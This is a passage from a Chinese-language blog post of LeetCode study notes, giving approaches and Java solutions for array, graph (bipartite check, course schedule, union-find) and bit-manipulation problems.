将数组看成链表，val是结点值也是下个节点的地址。因此这个问题就可以转换成判断链表有环，且找出入口节点—使用快慢指针，一个时间复杂度为O(N)的算法。</p><ol><li><p>对于链表问题，使用快慢指针可以判断是否有环。</p></li><li><p>本题可以使用数组配合下标，抽象成链表问题。但是难点是要定位环的入口位置。<br />  举个例子：nums = [2,5, 9 ,6,9,3,8, 9 ,7,1]，构造成链表就是：2-&gt;[9]-&gt;1-&gt;5-&gt;3-&gt;6-&gt;8-&gt;7-&gt;[9]，也就是在[9]处循环。</p></li><li><p>快慢指针问题，会在环内的[9]-&gt;1-&gt;5-&gt;3-&gt;6-&gt;8-&gt;7-&gt;[9]任何一个节点追上，不一定是在[9]处相碰，事实上会在7处碰上。</p></li><li><p>必须另起一个for循环定位环入口位置[9]。假设从头节点开始，走M步可以访问到循环的入口位置，那么当快慢指针相遇时，慢指针走了N步，则快指针就走了2N步，假设从入口位置到相遇位置还要走P步，那么克制，慢指针如果再走(N-P)步，就可以到达入口节点，而N-P=M，故如果此时用一个指针从0开始与慢指针一起走，两个指针会在循环入口处相遇。</p></li></ol><h4 id="代码-136"><a class="markdownIt-Anchor" href="#代码-136"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findDuplicate</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> slow = nums[<span class="number">0</span>], fast = nums[nums[<span class="number">0</span>]];</span><br><span class="line">        <span class="keyword">while</span> (slow != fast) &#123;</span><br><span class="line">            slow = nums[slow];</span><br><span class="line">            fast = nums[nums[fast]];</span><br><span class="line">        &#125;</span><br><span class="line">        fast = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (slow != fast) &#123;</span><br><span class="line">            slow = nums[slow];</span><br><span class="line">            fast = nums[fast];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-数组相邻差值的个数"><a class="markdownIt-Anchor" href="#8-数组相邻差值的个数"></a> 8. 数组相邻差值的个数</h3><p>  <a href="https://leetcode-cn.com/problems/beautiful-arrangement-ii/">https://leetcode-cn.com/problems/beautiful-arrangement-ii/</a></p><h4 id="思路-139"><a class="markdownIt-Anchor" href="#思路-139"></a> 思路</h4><p>  在区间<code>[0,k]</code>内，偶数下标填充<code>[1,2,3,...]</code>奇数下标填充<code>[k+1,k,k-1,...]</code>，剩下的按顺序填充。</p><h4 id="代码-137"><a class="markdownIt-Anchor" href="#代码-137"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] constructArray(<span class="keyword">int</span> n, <span class="keyword">int</span> k) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] res=<span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">        <span class="keyword">int</span> sin=<span class="number">1</span>,dou=k+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=k;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span>)</span><br><span class="line">                res[i]=sin++;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                res[i]=dou--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=k+<span class="number">1</span>;i&lt;n;i++)</span><br><span class="line">            res[i]=i+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-数组的度"><a class="markdownIt-Anchor" href="#9-数组的度"></a> 9. 数组的度</h3><p>  <a href="https://leetcode-cn.com/problems/degree-of-an-array/">https://leetcode-cn.com/problems/degree-of-an-array/</a></p><h4 id="思路-140"><a class="markdownIt-Anchor" href="#思路-140"></a> 思路</h4><p>  用Map来保存每个数的出现频次与左右边界，最后遍历查找频次最高且左右边界距离最近的。</p><h4 id="代码-138"><a class="markdownIt-Anchor" href="#代码-138"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findShortestSubArray</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        Map&lt;Integer,<span class="keyword">int</span>[]&gt; res=<span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(!res.containsKey(nums[i]))</span><br><span class="line">            &#123;</span><br><span class="line">                res.put(nums[i],<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1</span>,i,i&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span>[] temp=res.get(nums[i]);</span><br><span class="line">                temp[<span class="number">0</span>]++;</span><br><span class="line">                temp[<span class="number">2</span>]=i;</span><br><span class="line">                res.put(nums[i],temp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> max=<span class="number">0</span>,left=<span class="number">0</span>,right=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span>[] temp=res.get(nums[i]);</span><br><span class="line">            <span class="keyword">if</span>(max&lt;temp[<span class="number">0</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                max=temp[<span class="number">0</span>];</span><br><span class="line">                left=temp[<span class="number">1</span>];</span><br><span class="line">                right=temp[<span class="number">2</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(max==temp[<span class="number">0</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>((right-left)&gt;(temp[<span class="number">2</span>]-temp[<span class="number">1</span>]))</span><br><span class="line">                &#123;</span><br><span class="line">                    left=temp[<span class="number">1</span>];</span><br><span class="line">                    right=temp[<span class="number">2</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> right-left+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//数组版</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findShortestSubArray</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">     </span><br><span class="line">       <span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">            max = Math.max(max, num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span>[] mapSize = <span class="keyword">new</span> <span class="keyword">int</span>[max + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">int</span>[] mapMin = <span class="keyword">new</span> <span class="keyword">int</span>[max + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">int</span>[] mapMax = <span class="keyword">new</span> <span class="keyword">int</span>[max + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">int</span> maxSize = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> num = nums[i];</span><br><span class="line">            <span class="keyword">if</span> (mapSize[num] == <span class="number">0</span>) &#123;</span><br><span class="line">                mapMin[num] = i;</span><br><span class="line">                mapMax[num] = i;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                mapMax[num] = i;</span><br><span class="line">            &#125;</span><br><span class="line">            maxSize = Math.max(maxSize, ++mapSize[num]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> ans = Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num = <span class="number">0</span>; num &lt;= max; num++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (maxSize == mapSize[num]) &#123;</span><br><span class="line">                ans = Math.min(ans, mapMax[num] - mapMin[num] + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-对角元素相等的矩阵"><a class="markdownIt-Anchor" href="#10-对角元素相等的矩阵"></a> 10. 对角元素相等的矩阵</h3><p>  <a href="https://leetcode-cn.com/problems/toeplitz-matrix/">https://leetcode-cn.com/problems/toeplitz-matrix/</a></p><h4 id="思路-141"><a class="markdownIt-Anchor" href="#思路-141"></a> 思路</h4><p>  只需比较当前行除最后一个元素外的其他元素与下一行除第一个元素外的其他元素是否对应想等即可。</p><h4 id="代码-139"><a class="markdownIt-Anchor" href="#代码-139"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isToeplitzMatrix</span><span class="params">(<span class="keyword">int</span>[][] matrix)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m=matrix.length;</span><br><span class="line">        <span class="keyword">int</span> n=matrix[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m-<span class="number">1</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n-<span class="number">1</span>;j++)</span><br><span class="line">                <span class="keyword">if</span>(matrix[i][j]!=matrix[i+<span class="number">1</span>][j+<span class="number">1</span>])</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="11-嵌套数组"><a class="markdownIt-Anchor" href="#11-嵌套数组"></a> 11. 嵌套数组</h3><p>  <a href="https://leetcode-cn.com/problems/array-nesting/">https://leetcode-cn.com/problems/array-nesting/</a></p><h4 id="思路-142"><a class="markdownIt-Anchor" href="#思路-142"></a> 思路</h4><p>  题意可以理解为在数组中寻找最大环路，那么就从头开始遍历数组，对于每个访问到的数字都打上标记，这样一来可以在环形访问时发现形成环，二来可以在后续遍历时停止访问，因为如果先前遍历时已经访问过，那么这个数字的环路解已经被考虑过了。</p><h4 id="代码-140"><a class="markdownIt-Anchor" href="#代码-140"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">arrayNesting</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i; nums[j] != -<span class="number">1</span>; ) &#123;</span><br><span class="line">                cnt++;</span><br><span class="line">                <span class="keyword">int</span> t = nums[j];</span><br><span class="line">                nums[j] = -<span class="number">1</span>; <span class="comment">// 标记该位置已经被访问</span></span><br><span class="line">                j = t;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            max = Math.max(max, cnt);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="12-分隔数组"><a class="markdownIt-Anchor" href="#12-分隔数组"></a> 12. 分隔数组</h3><p>  <a href="https://leetcode-cn.com/problems/max-chunks-to-make-sorted/">https://leetcode-cn.com/problems/max-chunks-to-make-sorted/</a></p><h4 id="思路-143"><a class="markdownIt-Anchor" href="#思路-143"></a> 思路</h4><p>  在任意切分点，如果想要切分，必然需要当前块元素都小于下一块的元素。<br />  那么对于如何寻找切分点，只要寻找当前块的最大值，当最大值等于遍历下标时，即满足了条件。</p><h4 id="代码-141"><a class="markdownIt-Anchor" href="#代码-141"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxChunksToSorted</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> max=-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;arr.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            max=Math.max(max,arr[i]);</span><br><span class="line">            <span class="keyword">if</span>(max==i)</span><br><span class="line">            &#123;</span><br><span class="line">                res++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="七-图"><a class="markdownIt-Anchor" href="#七-图"></a> 七、图</h2><p>  超出了我的能力范围，题做的超级艰难。</p><h3 id="1-判断是否为二分图"><a class="markdownIt-Anchor" href="#1-判断是否为二分图"></a> 1. 判断是否为二分图</h3><p>  <a href="https://leetcode-cn.com/problems/is-graph-bipartite/">https://leetcode-cn.com/problems/is-graph-bipartite/</a></p><h4 id="思路-144"><a class="markdownIt-Anchor" href="#思路-144"></a> 思路</h4><p>  用辅助数组来标记每个节点染色情况，然后从头开始遍历所有节点，从当前节点出发，若已染色则无需遍历，若未染色则染A色，然后遍历所有可达节点进行查询，若节点未染色则染反色，若已染色则判断是否为反色。</p><h4 id="代码-142"><a class="markdownIt-Anchor" href="#代码-142"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isBipartite</span><span class="params">(<span class="keyword">int</span>[][] graph)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] res=<span class="keyword">new</span> <span class="keyword">int</span>[graph.length];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;graph.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (res[i] == <span class="number">0</span> &amp;&amp; !sup(i, <span class="number">1</span>, res, graph)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">sup</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> flag,<span class="keyword">int</span>[] res,<span class="keyword">int</span>[][] graph)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(res[i]!=<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> res[i]==flag;</span><br><span class="line">        res[i]=flag;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;graph[i].length;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(!sup(graph[i][j],-flag,res,graph))</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-课程安排的合法性"><a class="markdownIt-Anchor" href="#2-课程安排的合法性"></a> 2. 课程安排的合法性</h3><p>  <a href="https://leetcode-cn.com/problems/course-schedule/">https://leetcode-cn.com/problems/course-schedule/</a></p><h4 id="思路-145"><a class="markdownIt-Anchor" href="#思路-145"></a> 思路</h4><p>  先遍历一次图，获得每个课程的入度(被指次数)，也就是需要的前驱课程的数量。<br />  对于入度为0的课程，他们不需要任何前驱，所以可以从这些课程作为起点，开始向后遍历，把他们指向的课程入度都-1，然后判断这些课程是否入度会变为0，如果变为0说明这些课程是可以满足需求的，故可以继续入队列作为条件向下判断。<br />  最后看是否所有课程都满足需求。</p><h4 id="代码-143"><a class="markdownIt-Anchor" href="#代码-143"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canFinish</span><span class="params">(<span class="keyword">int</span> numCourses, <span class="keyword">int</span>[][] prerequisites)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] in=<span class="keyword">new</span> <span class="keyword">int</span>[numCourses];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;prerequisites.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            in[prerequisites[i][<span class="number">0</span>]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        LinkedList&lt;Integer&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;numCourses;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(in[i]==<span class="number">0</span>) queue.addLast(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> safe=queue.remove();</span><br><span class="line">            numCourses--;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;prerequisites.length;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(prerequisites[i][<span class="number">1</span>]==safe)</span><br><span class="line">                &#123;</span><br><span class="line">                    in[prerequisites[i][<span class="number">0</span>]]--;</span><br><span class="line">                    <span class="keyword">if</span>(in[prerequisites[i][<span class="number">0</span>]]==<span class="number">0</span>)</span><br><span class="line">                        queue.add(prerequisites[i][<span class="number">0</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> numCourses == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-课程安排的顺序"><a class="markdownIt-Anchor" href="#3-课程安排的顺序"></a> 3. 课程安排的顺序</h3><p>  <a href="https://leetcode-cn.com/problems/course-schedule-ii/">https://leetcode-cn.com/problems/course-schedule-ii/</a></p><h4 id="思路-146"><a class="markdownIt-Anchor" href="#思路-146"></a> 思路</h4><p>  与上一题一致，对于入度为0的课程就是可以学习的课程，所以只需要保存我们队列中的顺序即可。</p><h4 id="代码-144"><a class="markdownIt-Anchor" href="#代码-144"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] findOrder(<span class="keyword">int</span> numCourses, <span class="keyword">int</span>[][] prerequisites) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] res=<span class="keyword">new</span> <span class="keyword">int</span>[numCourses];</span><br><span class="line">        <span class="keyword">int</span> rescount=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span>[] in=<span class="keyword">new</span> <span class="keyword">int</span>[numCourses];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;prerequisites.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            in[prerequisites[i][<span class="number">0</span>]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        LinkedList&lt;Integer&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;numCourses;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(in[i]==<span class="number">0</span>) </span><br><span class="line">            &#123;</span><br><span class="line">                queue.addLast(i);</span><br><span class="line">                res[rescount++]=i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> safe=queue.remove();</span><br><span class="line">            numCourses--;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;prerequisites.length;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(prerequisites[i][<span class="number">1</span>]==safe)</span><br><span class="line">                &#123;</span><br><span class="line">                    in[prerequisites[i][<span class="number">0</span>]]--;</span><br><span class="line">                    <span class="keyword">if</span>(in[prerequisites[i][<span class="number">0</span>]]==<span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        queue.add(prerequisites[i][<span class="number">0</span>]);</span><br><span class="line">                        res[rescount++]=prerequisites[i][<span class="number">0</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(numCourses==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-冗余连接"><a class="markdownIt-Anchor" href="#4-冗余连接"></a> 4. 冗余连接</h3><p>  <a href="https://leetcode-cn.com/problems/redundant-connection/">https://leetcode-cn.com/problems/redundant-connection/</a></p><h4 id="思路-147"><a class="markdownIt-Anchor" href="#思路-147"></a> 思路</h4><p>  利用并查集，保存每个边的通路，寻找父节点，最后如果找到父节点相同的两个点，这条边就是多余的。</p><h4 id="代码-145"><a class="markdownIt-Anchor" href="#代码-145"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] findRedundantConnection(<span class="keyword">int</span>[][] edges) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] father = <span class="keyword">new</span> <span class="keyword">int</span>[edges.length+<span class="number">1</span>];<span class="comment">//并查集</span></span><br><span class="line">        <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">1</span>; i &lt; father.length; i++ ) </span><br><span class="line">            father[i] = i;<span class="comment">//初始化并查集</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span>[] edge : edges) &#123;</span><br><span class="line">        <span class="keyword">int</span> fIndex1 = findFather(father, edge[<span class="number">0</span>]);<span class="comment">//找到顶点的组先</span></span><br><span class="line">        <span class="keyword">int</span> fIndex2 = findFather(father, edge[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">if</span> ( fIndex1 != fIndex2 ) &#123;</span><br><span class="line">                <span class="comment">//如果祖先不同，说明不是多余的边</span></span><br><span class="line">        father[fIndex1] = fIndex2;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//祖先相同，说明是多余的边</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;edge[<span class="number">0</span>],edge[<span class="number">1</span>]&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findFather</span><span class="params">( <span class="keyword">int</span>[] father, <span class="keyword">int</span> index )</span> </span>&#123;<span class="comment">//路径压缩</span></span><br><span class="line"><span class="keyword">if</span> ( index == father[index] ) <span class="keyword">return</span> index;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">int</span> temp = findFather(father, father[index]);</span><br><span class="line">father[index] = temp;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="八-位运算"><a class="markdownIt-Anchor" href="#八-位运算"></a> 八、位运算</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java 中的位操作</span><br><span class="line"></span><br><span class="line">static int Integer.bitCount();           &#x2F;&#x2F; 统计 1 的数量</span><br><span class="line">static int Integer.highestOneBit();      &#x2F;&#x2F; 获得最高位</span><br><span class="line">static String toBinaryString(int i);     &#x2F;&#x2F; 转换为二进制表示的字符串</span><br></pre></td></tr></table></figure><h3 id="1-统计两个数的二进制表示有多少位不同"><a class="markdownIt-Anchor" href="#1-统计两个数的二进制表示有多少位不同"></a> 1. 统计两个数的二进制表示有多少位不同</h3><p>  <a href="https://leetcode-cn.com/problems/hamming-distance/">https://leetcode-cn.com/problems/hamming-distance/</a></p><h4 id="思路-148"><a class="markdownIt-Anchor" href="#思路-148"></a> 思路</h4><p>  对两个数进行异或操作，位级表示不同的那一位为 1，统计有多少个 1 即可。</p><h4 id="代码-146"><a class="markdownIt-Anchor" href="#代码-146"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hammingDistance</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> temp=x^y;</span><br><span class="line">        <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(temp!=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="keyword">if</span>((temp&amp;<span class="number">1</span>)==<span class="number">1</span>)</span><br><span class="line">               count++;</span><br><span class="line">            temp=temp&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-数组中唯一一个不重复的元素"><a class="markdownIt-Anchor" href="#2-数组中唯一一个不重复的元素"></a> 2. 数组中唯一一个不重复的元素</h3><p>  <a href="https://leetcode-cn.com/problems/single-number/">https://leetcode-cn.com/problems/single-number/</a></p><h4 id="思路-149"><a class="markdownIt-Anchor" href="#思路-149"></a> 思路</h4><p>  遍历异或，相同的异或是0。</p><h4 id="代码-147"><a class="markdownIt-Anchor" href="#代码-147"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">singleNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> res=nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;nums.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            res^=nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-找出数组中缺失的那个数"><a class="markdownIt-Anchor" href="#3-找出数组中缺失的那个数"></a> 3. 找出数组中缺失的那个数</h3><p>  <a href="https://leetcode-cn.com/problems/missing-number/">https://leetcode-cn.com/problems/missing-number/</a></p><h4 id="思路-150"><a class="markdownIt-Anchor" href="#思路-150"></a> 思路</h4><p>  如果在数组的基础上再加上0~n,就变成了找数组中不重复的元素。</p><h4 id="代码-148"><a class="markdownIt-Anchor" href="#代码-148"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span 